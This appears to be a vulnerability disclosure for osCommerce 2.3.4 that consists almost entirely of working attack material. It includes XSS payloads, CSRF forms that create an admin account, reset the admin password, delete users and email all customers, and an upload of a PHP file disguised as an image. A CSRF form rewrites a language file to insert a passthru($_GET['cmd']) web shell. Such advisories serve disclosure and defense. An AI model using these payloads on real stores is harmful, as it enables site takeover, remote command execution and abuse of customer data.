@@ -1,0 +1,664 @@
+#Title: osCommerce 2.3.4 - Multiple vulnerabilities
+#Date: 10.07.14
+#Affected versions: => 2.3.4 (latest atm)
+#Vendor: oscommerce.com
+#Tested on: Apache 2.2.22 [at] Debian
+#Contact: smash [at] devilteam.pl
+ 
+#Cross Site Scripting
+ 
+ 1. Reflected XSS -> Send Email
+ 
+Vulnerable parameters - customers_email_address & mail_sent_to
+ 
+a) POST
+ 
+Request:
+POST /osc/oscommerce-2.3.4/catalog/admin/mail.php?action=preview HTTP/1.1
+Host: localhost
+ 
+customers_email_address=<script>alert(666)</script>&from=fuck@shit.up&subject=test&message=test
+ 
+Response:
+HTTP/1.1 200 OK
+(...)
+<td class="smallText"><strong>Customer:</strong><br /><script>alert(666)</script></td>
+</tr>
+(...)
+ 
+CSRF PoC:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/mail.php?action=preview" method="POST">
+      <input type="hidden" name="customers_email_address" value="<script>alert(666)</script>" />
+      <input type="hidden" name="from" value="fuck@shit.up" />
+      <input type="hidden" name="subject" value="test" />
+      <input type="hidden" name="message" value="test" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+ 
+b) GET
+ 
+Request:
+GET /osc/oscommerce-2.3.4/catalog/admin/mail.php?mail_sent_to=%3Cscript%3Ealert(666)%3C/script%3E HTTP/1.1
+Host: localhost
+ 
+Response:
+(...)
+<td class="messageStackSuccess"><img src="images/icons/success.gif" border="0" alt="Success" title="Success" />&nbps;Notice: Email sent to: <script>alert(666)</script></td>
+</tr>
+(...)
+ 
+ 
+ 2. Persistent XSS via CSRF -> Newsletter
+ 
+Request:
+POST /osc/oscommerce-2.3.4/catalog/admin/newsletters.php?action=insert HTTP/1.1
+Host: localhost
+ 
+module=newsletter&title=<script>alert(123)</script>&content=<script>alert(456)</script>
+ 
+CSRF PoC:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/newsletters.php?action=insert" method="POST">
+      <input type="hidden" name="module" value="newsletter" />
+      <input type="hidden" name="title" value="<script>alert(123)</script>" />
+      <input type="hidden" name="content" value="<script>alert(456)</script>" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+ 
+First popbox (123) will be executed whenever someone will visit newsletters page:
+localhost/osc/oscommerce-2.3.4/catalog/admin/newsletters.php
+ 
+(...)
+<td class="dataTableContent"><a href="http://localhost/osc/oscommerce-2.3.4/catalog/admin/newsletters.php?page=1&nID=2&action=preview"><img src="images/icons/preview.gif" border="0" alt="Preview" title="Preview" /></a>&nbps;<script>alert(123)</script></td>
+(...)
+<tr class="infoBoxHeading">
+<td class="infoBoxHeading"><strong><script>alert(123)</script></strong></td>
+</tr>
+(...)
+ 
+Second one, will be executed whenever someone will visit specific newsletter page:
+localhost/osc/oscommerce-2.3.4/catalog/admin/newsletters.php?page=1&nID=1&action=preview
+ 
+(...)
+<tr>
+<td><tt><script>alert(456)</script></tt></td>
+</tr>
+<tr>
+(...)
+ 
+3. Persistent XSS via CSRF -> Banner manager
+ 
+Vulnerable parameter - banners_title
+ 
+PoC:
+<html>
+  <body>
+    <script>
+      function go()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/osc/oscommerce-2.3.4/catalog/admin/banner_manager.php?action=insert", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------19390593192018454503847724432");
+        xhr.withCredentials = true;
+        var body = "-----------------------------19390593192018454503847724432\r\n" +
+          "Content-Disposition: form-data; name=\"banners_title\"\r\n" +
+          "\r\n" +
+          "\x3cscript\x3ealert(666)\x3c/script\x3e\r\n" +
+          "-----------------------------19390593192018454503847724432\r\n" +
+          "Content-Disposition: form-data; name=\"banners_url\"\r\n" +
+          "\r\n" +
+          "url\r\n" +
+          "-----------------------------19390593192018454503847724432\r\n" +
+          "Content-Disposition: form-data; name=\"banners_group\"\r\n" +
+          "\r\n" +
+          "footer\r\n" +
+          "-----------------------------19390593192018454503847724432\r\n" +
+          "Content-Disposition: form-data; name=\"new_banners_group\"\r\n" +
+          "\r\n" +
+          "group\r\n" +
+          "-----------------------------19390593192018454503847724432\r\n" +
+          "Content-Disposition: form-data; name=\"banners_image\"; filename=\"info.gif\"\r\n" +
+          "Content-Type: application/x-php\r\n" +
+          "\r\n" +
+          "\x3c?php\n" +
+          "phpinfo();\n" +
+          "?\x3e\n" +
+          "\r\n" +
+          "-----------------------------19390593192018454503847724432\r\n" +
+          "Content-Disposition: form-data; name=\"banners_image_local\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------19390593192018454503847724432\r\n" +
+          "Content-Disposition: form-data; name=\"banners_image_target\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------19390593192018454503847724432\r\n" +
+          "Content-Disposition: form-data; name=\"banners_html_text\"\r\n" +
+          "\r\n" +
+          "sup\r\n" +
+          "-----------------------------19390593192018454503847724432\r\n" +
+          "Content-Disposition: form-data; name=\"date_scheduled\"\r\n" +
+          "\r\n" +
+          "2014-07-01\r\n" +
+          "-----------------------------19390593192018454503847724432\r\n" +
+          "Content-Disposition: form-data; name=\"expires_date\"\r\n" +
+          "\r\n" +
+          "2014-07-31\r\n" +
+          "-----------------------------19390593192018454503847724432\r\n" +
+          "Content-Disposition: form-data; name=\"expires_impressions\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------19390593192018454503847724432--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Go" onclick="go();" />
+    </form>
+  </body>
+</html>
+ 
+JS will be executed whenever someone will visitd banner manager page or specific banner page.
+ 
+localhost/osc/oscommerce-2.3.4/catalog/admin/banner_manager.php
+localhost/osc/oscommerce-2.3.4/catalog/admin/banner_manager.php?page=1&bID=[ID]
+ 
+Response:
+<td class="dataTableContent"><a href="javascript:popupImageWindow('popup_image.php?banner=3')"><img src="images/icon_popup.gif" border="0" alt="View Banner" title="View Banner" /></a>&nbps;<script>alert(666)</script></td>
+<td class="dataTableContent" align="right">group</td>
+ 
+ 
+ 4. Persistent XSS via CSRF -> Locations / Taxes
+ 
+Countries tab is taken as example, but same vulnerability affects other tabs in 'Locations / Taxes', namely Tax Classes, Tax Rates, Tax Zones and Zones.
+ 
+ PoC:
+ <html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/countries.php?page=1&action=insert" method="POST">
+      <input type="hidden" name="countries_name" value="AAAA<script>alert(666)</script>" />
+      <input type="hidden" name="countries_iso_code_2" value="xs" />
+      <input type="hidden" name="countries_iso_code_3" value="sed" />
+      <input type="hidden" name="address_format_id" value="1" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+ 
+JS will be executed whenever someone will visitd 'countries' tab:
+localhost/osc/oscommerce-2.3.4/catalog/admin/countries.php
+ 
+Response:
+(...)
+<tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href='http://localhost/osc/oscommerce-2.3.4/catalog/admin/countries.php?page=1&cID=241&action=edit'">
+<td class="dataTableContent">AAAA<script>alert(666)</script></td>
+<td class="dataTableContent" align="center" width="40">xs</td>
+<td class="dataTableContent" align="center" width="40">sed</td>
+(...)
+ 
+ 5. Persistent XSS via CSRF -> Localization
+ 
+ a) Currencies
+ 
+PoC:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/currencies.php?page=1&action=insert" method="POST">
+      <input type="hidden" name="cs" value="" />
+      <input type="hidden" name="title" value="<script>alert(666)</script>" />
+      <input type="hidden" name="code" value="666" />
+      <input type="hidden" name="symbol_left" value="hm" />
+      <input type="hidden" name="symbol_right" value="mh" />
+      <input type="hidden" name="decimal_point" value="10" />
+      <input type="hidden" name="thousands_point" value="100" />
+      <input type="hidden" name="decimal_places" value="10000" />
+      <input type="hidden" name="value" value="666"><script>alert(123)</script>" />
+      <input type="hidden" name="default" value="on" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+ 
+JS will be executed whenever someone will visit currencies tab:
+localhost/osc/oscommerce-2.3.4/catalog/admin/currencies.php
+ 
+Response:
+(...)
+<tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href='http://localhost/osc/oscommerce-2.3.4/catalog/admin/currencies.php?page=1&cID=3&action=edit'">
+<td class="dataTableContent"><strong><script>alert(666)</script> (default)</strong></td>
+<td class="dataTableContent">666</td>
+<td class="dataTableContent" align="right">666.00000000</td>
+(...)
+  
+ b) Languages
+ 
+PoC:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/languages.php?action=insert" method="POST">
+      <input type="hidden" name="name" value=""><script>alert(666)</script>" />
+      <input type="hidden" name="code" value="h3ll" />
+      <input type="hidden" name="image" value="icon.gif" />
+      <input type="hidden" name="directory" value="asdf" />
+      <input type="hidden" name="sort_order" value="asdf" />
+      <input type="hidden" name="default" value="on" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+ 
+JS will be executed whenever someone will visit langauges tab:
+localhost/osc/oscommerce-2.3.4/catalog/admin/languages.php
+ 
+Response:
+(...)
+<tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href='http://localhost/osc/oscommerce-2.3.4/catalog/admin/languages.php?page=1&lID=2&action=edit'">
+<td class="dataTableContent"><script>alert(666)</script></td>
+<td class="dataTableContent">66</td>
+(...)
+ 
+ c) Orders status
+ 
+Request:
+POST /osc/oscommerce-2.3.4/catalog/admin/orders_status.php?page=1&action=insert HTTP/1.1
+Host: localhost
+ 
+orders_status_name%5B2%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B3%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B4%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B5%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B6%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B7%5D=%27%3E%22%3E%3C%3EXSS&orders_status_name%5B1%5D=%27%3E%22%3E%3C%3EXSS
+ 
+Response:
+(...)
+<td class="dataTableContent">'>"><>XSS</td>
+(...)
+<td class="infoBoxHeading"><strong>'>"><>XSS</strong></td>
+(...)
+<td class="infoBoxContent"><br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif" border="0" alt="<script>alert(666)</script>" title="<script>alert(666)</script>" />&nbps;'>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif" border="0" alt=""><script>alert(666)</script>" title=""><script>alert(666)</script>" />&nbps;'>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf'>"><>XSS/images/icon.gif'>"><>XSS" border="0" alt=""><script>alert(666)</script>" title=""><script>alert(666)</script>" />&nbps;'>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif'>"><>XSS" border="0" alt=""><script>alert(666)</script>" title=""><script>alert(666)</script>" />&nbps;'>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif" border="0" alt=""><script>alert(666)</script>" title=""><script>alert(666)</script>" />&nbps;'>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/asdf/images/icon.gif'>"><>XSS" border="0" alt=""><script>alert(666)</script>" title=""><script>alert(666)</script>" />&nbps;'>"><>XSS<br /><img src="http://localhost/osc/oscommerce-2.3.4/catalog/includes/languages/english/images/icon.gif" border="0" alt="English" title="English" />&nbps;'>"><>XSS</td>
+  </tr>
+ 
+ 
+ 
+#Boring CSRF
+ 
+ - Remove any item from cart
+ 
+localhost/osc/oscommerce-2.3.4/catalog/shopping_cart.php?products_id=[ID]&action=remove_product
+ 
+ - Add item to cart
+ 
+localhost/osc/oscommerce-2.3.4/catalog/product_info.php?products_id=[ID]&action=add_product
+ 
+ - Remove address book entry
+ 
+localhost/osc/oscommerce-2.3.4/catalog/address_book_process.php?delete=1
+ 
+ - Remove specific country
+ 
+localhost/osc/oscommerce-2.3.4/catalog/admin/countries.php?page=1&cID=1&action=deleteconfirm
+ 
+ - Remove specific currency
+ 
+localhost/osc/oscommerce-2.3.4/catalog/admin/currencies.php?page=1&cID=[ID]&action=deleteconfirm
+ 
+ - Change store credentials
+ 
+I'm to bored to craft another request's, whole 'Configuration' & 'Catalog' panel suffers on CSRF.
+ 
+localhost/osc/oscommerce-2.3.4/catalog/admin/configuration.php
+ 
+...and a lot more.
+ 
+ 
+ 
+#Less boring CSRF
+ 
+ - Send email as admin -> Send email
+ 
+It is able to send email to specific user, newsletter subscribers and all of them. In this case, '***' stands for sending mail to all customers.
+ 
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/mail.php?action=send_email_to_user" method="POST">
+      <input type="hidden" name="customers_email_address" value="***" />
+      <input type="hidden" name="from" value=""storeowner" <storemail@lol.lo>" />
+      <input type="hidden" name="subject" value="subject" />
+      <input type="hidden" name="message" value="sup" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+ 
+ - Delete / Edit specific user
+ 
+Remove user PoC:
+localhost/osc/oscommerce-2.3.4/catalog/admin/customers.php?page=1&cID=1&action=deleteconfirm
+ 
+Edit user PoC:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/customers.php?page=1&cID=1&action=update" method="POST">
+      <input type="hidden" name="default_address_id" value="1" />
+      <input type="hidden" name="customers_gender" value="m" />
+      <input type="hidden" name="customers_firstname" value="juster" />
+      <input type="hidden" name="customers_lastname" value="testing" />
+      <input type="hidden" name="customers_dob" value="07/13/2004" />
+      <input type="hidden" name="customers_email_address" value="szit@szit.szit" />
+      <input type="hidden" name="entry_company" value="asdf" />
+      <input type="hidden" name="entry_street_address" value="asdfasdf" />
+      <input type="hidden" name="entry_suburb" value="asdfsdff" />
+      <input type="hidden" name="entry_postcode" value="66-666" />
+      <input type="hidden" name="entry_city" value="asdfasdf" />
+      <input type="hidden" name="entry_state" value="asdfasdfasdf" />
+      <input type="hidden" name="entry_country_id" value="5" />
+      <input type="hidden" name="customers_telephone" value="123456792" />
+      <input type="hidden" name="customers_fax" value="" />
+      <input type="hidden" name="customers_newsletter" value="1" />
+      <input type="submit" value="Go" />
+    </form>
+  </body>
+</html>
+ 
+ - Add / Edit / Delete admin
+ 
+Add admin account:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/administrators.php?action=insert" method="POST">
+      <input type="hidden" name="username" value="haxor" />
+      <input type="hidden" name="password" value="pwned" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+ 
+Change admin (set new password):
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/administrators.php?aID=1&action=save" method="POST">
+      <input type="hidden" name="username" value="admin" />
+      <input type="hidden" name="password" value="newpass" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+ 
+Remove admin:
+localhost/osc/oscommerce-2.3.4/catalog/admin/administrators.php?aID=2&action=deleteconfirm
+ 
+ 
+ - RCE via CSRF -> Define Languages
+ 
+It is able to change content of specific file in 'define languages' tab, we're gonna use default english language, and so default files path. File MUST be writable. Value stands for english.php default content; as you can notice, passthru function is being included.
+ 
+localhost/osc/oscommerce-2.3.4/catalog/includes/languages/english.php?cmd=uname -a
+ 
+PoC:
+<html>
+  <body>
+    <form action="http://localhost/osc/oscommerce-2.3.4/catalog/admin/define_language.php?lngdir=english&filename=english.php&action=save" method="POST">
+      <input type="hidden" name="file_contents" value="<?php
+/*
+  $Id$
+
+  osCommerce, Open Source E-Commerce Solutions
+  http://www.oscommerce.com
+
+  Copyright (c) 2013 osCommerce
+
+  Released under the GNU General Public License
+*/
+
+// look in your $PATH_LOCALE/locale directory for available locales
+// or type locale -a on the server.
+// Examples:
+// on RedHat try 'en_US'
+// on FreeBSD try 'en_US.ISO_8859-1'
+// on Windows try 'en', or 'English'
+@setlocale(LC_ALL, array('en_US.UTF-8', 'en_US.UTF8', 'enu_usa'));
+
+define('DATE_FORMAT_SHORT', '%m/%d/%Y');  // this is used for strftime()
+define('DATE_FORMAT_LONG', '%A %d %B, %Y'); // this is used for strftime()
+define('DATE_FORMAT', 'm/d/Y'); // this is used for date()
+define('DATE_TIME_FORMAT', DATE_FORMAT_SHORT . ' %H:%M:%S');
+define('JQUERY_DATEPICKER_I18N_CODE', ''); // leave empty for en_US; see http://jqueryui.com/demos/datepicker/#localization
+define('JQUERY_DATEPICKER_FORMAT', 'mm/dd/yy'); // see http://docs.jquery.com/UI/Datepicker/formatDate
+
+@passthru($_GET['cmd']);
+
+////
+// Return date in raw format
+// $date should be in format mm/dd/yyyy
+// raw date is in format YYYYMMDD, or DDMMYYYY
+function tep_date_raw($date, $reverse = false) {
+  if ($reverse) {
+    return substr($date, 3, 2) . substr($date, 0, 2) . substr($date, 6, 4);
+  } else {
+    return substr($date, 6, 4) . substr($date, 0, 2) . substr($date, 3, 2);
+  }
+}
+
+// if USE_DEFAULT_LANGUAGE_CURRENCY is true, use the following currency, instead of the applications default currency (used when changing language)
+define('LANGUAGE_CURRENCY', 'USD');
+
+// Global entries for the <html> tag
+define('HTML_PARAMS', 'dir="ltr" lang="en"');
+
+// charset for web pages and emails
+define('CHARSET', 'utf-8');
+
+// page title
+define('TITLE', STORE_NAME);
+
+// header text in includes/header.php
+define('HEADER_TITLE_CREATE_ACCOUNT', 'Create an Account');
+define('HEADER_TITLE_MY_ACCOUNT', 'My Account');
+define('HEADER_TITLE_CART_CONTENTS', 'Cart Contents');
+define('HEADER_TITLE_CHECKOUT', 'Checkout');
+define('HEADER_TITLE_TOP', 'Top');
+define('HEADER_TITLE_CATALOG', 'Catalog');
+define('HEADER_TITLE_LOGOFF', 'Log Off');
+define('HEADER_TITLE_LOGIN', 'Log In');
+
+// footer text in includes/footer.php
+define('FOOTER_TEXT_REQUESTS_SINCE', 'requests since');
+
+// text for gender
+define('MALE', 'Male');
+define('FEMALE', 'Female');
+define('MALE_ADDRESS', 'Mr.');
+define('FEMALE_ADDRESS', 'Ms.');
+
+// text for date of birth example
+define('DOB_FORMAT_STRING', 'mm/dd/yyyy');
+
+// checkout procedure text
+define('CHECKOUT_BAR_DELIVERY', 'Delivery Information');
+define('CHECKOUT_BAR_PAYMENT', 'Payment Information');
+define('CHECKOUT_BAR_CONFIRMATION', 'Confirmation');
+define('CHECKOUT_BAR_FINISHED', 'Finished!');
+
+// pull down default text
+define('PULL_DOWN_DEFAULT', 'Please Select');
+define('TYPE_BELOW', 'Type Below');
+
+// javascript messages
+define('JS_ERROR', 'Errors have occured during the process of your form.\n\nPlease make the following corrections:\n\n');
+
+define('JS_REVIEW_TEXT', '* The \'Review Text\' must have at least ' . REVIEW_TEXT_MIN_LENGTH . ' characters.\n');
+define('JS_REVIEW_RATING', '* You must rate the product for your review.\n');
+
+define('JS_ERROR_NO_PAYMENT_MODULE_SELECTED', '* Please select a payment method for your order.\n');
+
+define('JS_ERROR_SUBMITTED', 'This form has already been submitted. Please press Ok and wait for this process to be completed.');
+
+define('ERROR_NO_PAYMENT_MODULE_SELECTED', 'Please select a payment method for your order.');
+
+define('CATEGORY_COMPANY', 'Company Details');
+define('CATEGORY_PERSONAL', 'Your Personal Details');
+define('CATEGORY_ADDRESS', 'Your Address');
+define('CATEGORY_CONTACT', 'Your Contact Information');
+define('CATEGORY_OPTIONS', 'Options');
+define('CATEGORY_PASSWORD', 'Your Password');
+
+define('ENTRY_COMPANY', 'Company Name:');
+define('ENTRY_COMPANY_TEXT', '');
+define('ENTRY_GENDER', 'Gender:');
+define('ENTRY_GENDER_ERROR', 'Please select your Gender.');
+define('ENTRY_GENDER_TEXT', '*');
+define('ENTRY_FIRST_NAME', 'First Name:');
+define('ENTRY_FIRST_NAME_ERROR', 'Your First Name must contain a minimum of ' . ENTRY_FIRST_NAME_MIN_LENGTH . ' characters.');
+define('ENTRY_FIRST_NAME_TEXT', '*');
+define('ENTRY_LAST_NAME', 'Last Name:');
+define('ENTRY_LAST_NAME_ERROR', 'Your Last Name must contain a minimum of ' . ENTRY_LAST_NAME_MIN_LENGTH . ' characters.');
+define('ENTRY_LAST_NAME_TEXT', '*');
+define('ENTRY_DATE_OF_BIRTH', 'Date of Birth:');
+define('ENTRY_DATE_OF_BIRTH_ERROR', 'Your Date of Birth must be in this format: MM/DD/YYYY (eg 05/21/1970)');
+define('ENTRY_DATE_OF_BIRTH_TEXT', '* (eg. 05/21/1970)');
+define('ENTRY_EMAIL_ADDRESS', 'E-Mail Address:');
+define('ENTRY_EMAIL_ADDRESS_ERROR', 'Your E-Mail Address must contain a minimum of ' . ENTRY_EMAIL_ADDRESS_MIN_LENGTH . ' characters.');
+define('ENTRY_EMAIL_ADDRESS_CHECK_ERROR', 'Your E-Mail Address does not appear to be valid - please make any necessary corrections.');
+define('ENTRY_EMAIL_ADDRESS_ERROR_EXISTS', 'Your E-Mail Address already exists in our records - please log in with the e-mail address or create an account with a different address.');
+define('ENTRY_EMAIL_ADDRESS_TEXT', '*');
+define('ENTRY_STREET_ADDRESS', 'Street Address:');
+define('ENTRY_STREET_ADDRESS_ERROR', 'Your Street Address must contain a minimum of ' . ENTRY_STREET_ADDRESS_MIN_LENGTH . ' characters.');
+define('ENTRY_STREET_ADDRESS_TEXT', '*');
+define('ENTRY_SUBURB', 'Suburb:');
+define('ENTRY_SUBURB_TEXT', '');
+define('ENTRY_POST_CODE', 'Post Code:');
+define('ENTRY_POST_CODE_ERROR', 'Your Post Code must contain a minimum of ' . ENTRY_POSTCODE_MIN_LENGTH . ' characters.');
+define('ENTRY_POST_CODE_TEXT', '*');
+define('ENTRY_CITY', 'City:');
+define('ENTRY_CITY_ERROR', 'Your City must contain a minimum of ' . ENTRY_CITY_MIN_LENGTH . ' characters.');
+define('ENTRY_CITY_TEXT', '*');
+define('ENTRY_STATE', 'State/Province:');
+define('ENTRY_STATE_ERROR', 'Your State must contain a minimum of ' . ENTRY_STATE_MIN_LENGTH . ' characters.');
+define('ENTRY_STATE_ERROR_SELECT', 'Please select a state from the States pull down menu.');
+define('ENTRY_STATE_TEXT', '*');
+define('ENTRY_COUNTRY', 'Country:');
+define('ENTRY_COUNTRY_ERROR', 'You must select a country from the Countries pull down menu.');
+define('ENTRY_COUNTRY_TEXT', '*');
+define('ENTRY_TELEPHONE_NUMBER', 'Telephone Number:');
+define('ENTRY_TELEPHONE_NUMBER_ERROR', 'Your Telephone Number must contain a minimum of ' . ENTRY_TELEPHONE_MIN_LENGTH . ' characters.');
+define('ENTRY_TELEPHONE_NUMBER_TEXT', '*');
+define('ENTRY_FAX_NUMBER', 'Fax Number:');
+define('ENTRY_FAX_NUMBER_TEXT', '');
+define('ENTRY_NEWSLETTER', 'Newsletter:');
+define('ENTRY_NEWSLETTER_TEXT', '');
+define('ENTRY_NEWSLETTER_YES', 'Subscribed');
+define('ENTRY_NEWSLETTER_NO', 'Unsubscribed');
+define('ENTRY_PASSWORD', 'Password:');
+define('ENTRY_PASSWORD_ERROR', 'Your Password must contain a minimum of ' . ENTRY_PASSWORD_MIN_LENGTH . ' characters.');
+define('ENTRY_PASSWORD_ERROR_NOT_MATCHING', 'The Password Confirmation must match your Password.');
+define('ENTRY_PASSWORD_TEXT', '*');
+define('ENTRY_PASSWORD_CONFIRMATION', 'Password Confirmation:');
+define('ENTRY_PASSWORD_CONFIRMATION_TEXT', '*');
+define('ENTRY_PASSWORD_CURRENT', 'Current Password:');
+define('ENTRY_PASSWORD_CURRENT_TEXT', '*');
+define('ENTRY_PASSWORD_CURRENT_ERROR', 'Your Password must contain a minimum of ' . ENTRY_PASSWORD_MIN_LENGTH . ' characters.');
+define('ENTRY_PASSWORD_NEW', 'New Password:');
+define('ENTRY_PASSWORD_NEW_TEXT', '*');
+define('ENTRY_PASSWORD_NEW_ERROR', 'Your new Password must contain a minimum of ' . ENTRY_PASSWORD_MIN_LENGTH . ' characters.');
+define('ENTRY_PASSWORD_NEW_ERROR_NOT_MATCHING', 'The Password Confirmation must match your new Password.');
+define('PASSWORD_HIDDEN', '--HIDDEN--');
+
+define('FORM_REQUIRED_INFORMATION', '* Required information');
+
+// constants for use in tep_prev_next_display function
+define('TEXT_RESULT_PAGE', 'Result Pages:');
+define('TEXT_DISPLAY_NUMBER_OF_PRODUCTS', 'Displaying <strong>%d</strong> to <strong>%d</strong> (of <strong>%d</strong> products)');
+define('TEXT_DISPLAY_NUMBER_OF_ORDERS', 'Displaying <strong>%d</strong> to <strong>%d</strong> (of <strong>%d</strong> orders)');
+define('TEXT_DISPLAY_NUMBER_OF_REVIEWS', 'Displaying <strong>%d</strong> to <strong>%d</strong> (of <strong>%d</strong> reviews)');
+define('TEXT_DISPLAY_NUMBER_OF_PRODUCTS_NEW', 'Displaying <strong>%d</strong> to <strong>%d</strong> (of <strong>%d</strong> new products)');
+define('TEXT_DISPLAY_NUMBER_OF_SPECIALS', 'Displaying <strong>%d</strong> to <strong>%d</strong> (of <strong>%d</strong> specials)');
+
+define('PREVNEXT_TITLE_FIRST_PAGE', 'First Page');
+define('PREVNEXT_TITLE_PREVIOUS_PAGE', 'Previous Page');
+define('PREVNEXT_TITLE_NEXT_PAGE', 'Next Page');
+define('PREVNEXT_TITLE_LAST_PAGE', 'Last Page');
+define('PREVNEXT_TITLE_PAGE_NO', 'Page %d');
+define('PREVNEXT_TITLE_PREV_SET_OF_NO_PAGE', 'Previous Set of %d Pages');
+define('PREVNEXT_TITLE_NEXT_SET_OF_NO_PAGE', 'Next Set of %d Pages');
+define('PREVNEXT_BUTTON_FIRST', '<<FIRST');
+define('PREVNEXT_BUTTON_PREV', '[<<&nbsp;Prev]');
+define('PREVNEXT_BUTTON_NEXT', '[Next&nbsp;>>]');
+define('PREVNEXT_BUTTON_LAST', 'LAST>>');
+
+define('IMAGE_BUTTON_ADD_ADDRESS', 'Add Address');
+define('IMAGE_BUTTON_ADDRESS_BOOK', 'Address Book');
+define('IMAGE_BUTTON_BACK', 'Back');
+define('IMAGE_BUTTON_BUY_NOW', 'Buy Now');
+define('IMAGE_BUTTON_CHANGE_ADDRESS', 'Change Address');
+define('IMAGE_BUTTON_CHECKOUT', 'Checkout');
+define('IMAGE_BUTTON_CONFIRM_ORDER', 'Confirm Order');
+define('IMAGE_BUTTON_CONTINUE', 'Continue');
+define('IMAGE_BUTTON_CONTINUE_SHOPPING', 'Continue Shopping');
+define('IMAGE_BUTTON_DELETE', 'Delete');
+define('IMAGE_BUTTON_EDIT_ACCOUNT', 'Edit Account');
+define('IMAGE_BUTTON_HISTORY', 'Order History');
+define('IMAGE_BUTTON_LOGIN', 'Sign In');
+define('IMAGE_BUTTON_IN_CART', 'Add to Cart');
+define('IMAGE_BUTTON_NOTIFICATIONS', 'Notifications');
+define('IMAGE_BUTTON_QUICK_FIND', 'Quick Find');
+define('IMAGE_BUTTON_REMOVE_NOTIFICATIONS', 'Remove Notifications');
+define('IMAGE_BUTTON_REVIEWS', 'Reviews');
+define('IMAGE_BUTTON_SEARCH', 'Search');
+define('IMAGE_BUTTON_SHIPPING_OPTIONS', 'Shipping Options');
+define('IMAGE_BUTTON_TELL_A_FRIEND', 'Tell a Friend');
+define('IMAGE_BUTTON_UPDATE', 'Update');
+define('IMAGE_BUTTON_UPDATE_CART', 'Update Cart');
+define('IMAGE_BUTTON_WRITE_REVIEW', 'Write Review');
+
+define('SMALL_IMAGE_BUTTON_DELETE', 'Delete');
+define('SMALL_IMAGE_BUTTON_EDIT', 'Edit');
+define('SMALL_IMAGE_BUTTON_VIEW', 'View');
+
+define('ICON_ARROW_RIGHT', 'more');
+define('ICON_CART', 'In Cart');
+define('ICON_ERROR', 'Error');
+define('ICON_SUCCESS', 'Success');
+define('ICON_WARNING', 'Warning');
+
+define('TEXT_GREETING_PERSONAL', 'Welcome back <span class="greetUser">%s!</span> Would you like to see which <a href="%s"><u>new products</u></a> are available to purchase?');
+define('TEXT_GREETING_PERSONAL_RELOGON', '<small>If you are not %s, please <a href="%s"><u>log yourself in</u></a> with your account information.</small>');
+define('TEXT_GREETING_GUEST', 'Welcome <span class="greetUser">Guest!</span> Would you like to <a href="%s"><u>log yourself in</u></a>? Or would you prefer to <a href="%s"><u>create an account</u></a>?');
+
+define('TEXT_SORT_PRODUCTS', 'Sort products ');
+define('TEXT_DESCENDINGLY', 'descendingly');
+define('TEXT_ASCENDINGLY', 'ascendingly');
+define('TEXT_BY', ' by ');
+
+define('TEXT_REVIEW_BY', 'by %s');
+define('TEXT_REVIEW_WORD_COUNT', '%s words');
+define('TEXT_REVIEW_RATING', 'Rating: %s [%s]');
+define('TEXT_REVIEW_DATE_ADDED', 'Date Added: %s');
+define('TEXT_NO_REVIEWS', 'There are currently no product reviews.');
+
+define('TEXT_NO_NEW_PRODUCTS', 'There are currently no products.');
+
+define('TEXT_UNKNOWN_TAX_RATE', 'Unknown tax rate');
+
+define('TEXT_REQUIRED', '<span class="errorText">Required</span>');
+
